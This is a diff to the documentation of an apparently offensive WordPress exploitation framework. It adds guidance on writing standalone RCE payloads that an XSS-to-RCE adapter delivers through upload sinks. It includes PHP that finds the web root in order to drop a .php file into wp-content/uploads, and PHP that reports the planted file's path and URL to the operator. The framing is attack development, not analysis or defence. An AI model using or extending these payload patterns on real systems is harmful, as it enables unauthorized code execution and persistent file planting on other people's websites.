@@ -182,6 +182,56 @@ class Bash(Payload):
             return [cmd]
 ```
 
+## RCE Payloads Must Be Standalone
+
+A payload never knows how its instruction is delivered. An RCE instruction may
+run **inside WordPress** (native RCE — the exploit executes it in WP context) or
+**completely standalone** (the XSS→RCE adapter delivers it via an upload sink, so
+the dropped `.php` is hit directly and WordPress is never loaded).
+
+So RCE PHP must not depend on WordPress being loaded. In particular, **do not use
+`ABSPATH`** or other WP-defined constants/functions — they are undefined in the
+standalone case and the payload will fatal.
+
+Resolve what you need yourself. The canonical pattern for finding the web root:
+use `ABSPATH` if it happens to be defined, otherwise walk up from `__FILE__` to
+the directory holding `wp-load.php`, then fall back to `DOCUMENT_ROOT`:
+
+```php
+<?php
+$root = null;
+if (defined('ABSPATH')) {
+    $root = ABSPATH;                                   // inside WordPress
+} else {
+    $dir = dirname(__FILE__);                           // standalone
+    for ($i = 0; $i < 12; $i++) {
+        if (@file_exists($dir.'/wp-load.php') || @file_exists($dir.'/wp-config.php')) { $root = $dir; break; }
+        $parent = dirname($dir);
+        if ($parent === $dir) break;
+        $dir = $parent;
+    }
+    if ($root === null) { $root = !empty($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : dirname(__FILE__); }
+    $root = rtrim(str_replace('\\', '/', $root), '/') . '/';
+}
+$f = $root . 'wp-content/uploads/myfile.php';
+// ... write $f ...
+```
+
+### Echo where things landed, not just that they did
+
+Whatever your instruction `echo`s is captured as the result `output`. Under the
+XSS→RCE adapter the loader lands somewhere unrelated to where your PHP writes, so
+your echo is the **only** thing that tells the operator the real location. Echo
+the resolved path (and a URL if you can derive one), keeping whatever success
+token your `report()` checks for:
+
+```php
+$scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
+echo @file_exists($f)
+    ? 'DEPLOYED path='.$f.' url='.$scheme.'://'.$_SERVER['HTTP_HOST'].'/wp-content/uploads/myfile.php'
+    : 'FAILED path='.$f;
+```
+
 ## Available Payloads
 
 | Payload | Methods | Description |
